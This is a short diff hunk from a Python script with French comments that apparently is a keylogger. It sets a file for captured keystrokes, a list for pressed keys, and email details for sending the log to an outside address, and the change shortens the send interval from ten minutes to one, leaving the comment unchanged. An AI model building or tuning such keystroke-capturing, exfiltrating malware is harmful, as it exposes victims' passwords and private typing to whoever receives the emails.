@@ -16,7 +16,7 @@ to_email = 'PlasticeaterG12@outlook.com'
 subject = 'Voici votre fichier texte'
 body = 'Veuillez trouver en pièce jointe le fichier texte demandé.'
 file_path = 'C:/Temp/touches_capturées.txt'
-interval = 600  # Intervalle en secondes (10 minutes = 600 secondes)
+interval = 60  # Intervalle en secondes (10 minutes = 600 secondes)
 
 # Liste pour stocker les touches appuyées
 touche_captures = []
